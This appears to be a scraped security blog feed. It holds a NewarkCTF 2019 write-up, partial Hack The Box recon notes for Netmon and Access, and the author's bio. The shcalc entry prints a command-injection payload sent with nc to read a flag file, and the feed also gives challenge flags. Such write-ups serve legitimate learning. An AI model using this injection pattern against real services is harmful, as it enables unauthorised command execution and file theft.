item.title: Newarkctf19 Writeup
item.description:
shcalc (200)

Description

Hint

Solution

Code Injection

echo '$(cat flag.txt | tr " " ".") 2>&1'  |  nc shell.2019.nactf.com 31214a

Flag

nactf{3v4l_1s_3v1l_dCf80yOo}

====================================================================================

BufferOverflow #0 (100)

Description

The close cousin of a website for “Question marked as duplicate” Can you cause a segfault and get the flag? shell.2019.nactf.com:31475

Hint

What does it mean to overflow the buffer?

Solution

Flag

nactf{0v3rfl0w_th4at_buff3r_18ghKusB}

====================================================================================

item.title: HTB/Netmon
item.description:
Reconnaissance

Box IP: 10.10.10.152
  1. I started by scanning the network. Here’s what I found:

  1. Port 80 hosts a login page for PRTG Network Monitor. I found it to be vulnerable to cross-site scripting (XSS).

  1. For FileZilla, I tried FTP. I was looking for a configuration file (configuration.old) that reportedly held credentials, according to this Reddit post link
  • Initially, I couldn‚Äôt find it until I learned it was hidden. Once I enabled ‚ÄúShow hidden files‚Äù in /programData/Paessler/PRTG Network Monitor, I found the configuration file.

item.title: HTB/ACCESS
item.description:
Reconnaissance

  1. Box IP: 10.10.10.98, I started with a network scan. Here’s what I found:
    PORT |  STATE | SERVICE | VERSION

    21/tcp | open | ftp    | Microsoft ftpd
    23/tcp | open | telnet |
    80/tcp | open | http   | Microsoft IIS httpd 7.5
  1. On port 80, there was a picture of a server room, “out.jpg”, which I saved for later.

item.title: $whoami
item.description:
Hi, I’m Islam Tohamy! I work as a Senior Security Engineer üë®‚Äçüíª in ICS/OT environments. Day-to-day, I work with tools like Metasploit, Nmap, Tenable, Impacket, BloodHound, Burp Suite, and Wireshark as part of doing network assessments and Active Directory testing. For OT network security, I work with tools like Claroty, Armis, and Microsoft Defender for IoT to manage assets, identify and remediate vulnerabilities, and monitor security.

I actually started out as an electrical engineer, building and programming low voltage controls e.g., IoT devices, smart wearables,then I moved to industrial controls (high voltage) programming PLCs, HMIs, VFDs, SCADA, and designing supervisory control cabinets (SCC), motor control cabinets (MCC) ..etc ‚Äî basically everything you‚Äôd expect in OT environments. That hands-on experience with the tech itself is what got me into OT security, where I found that I like to work on protecting these essential/industrial systems.
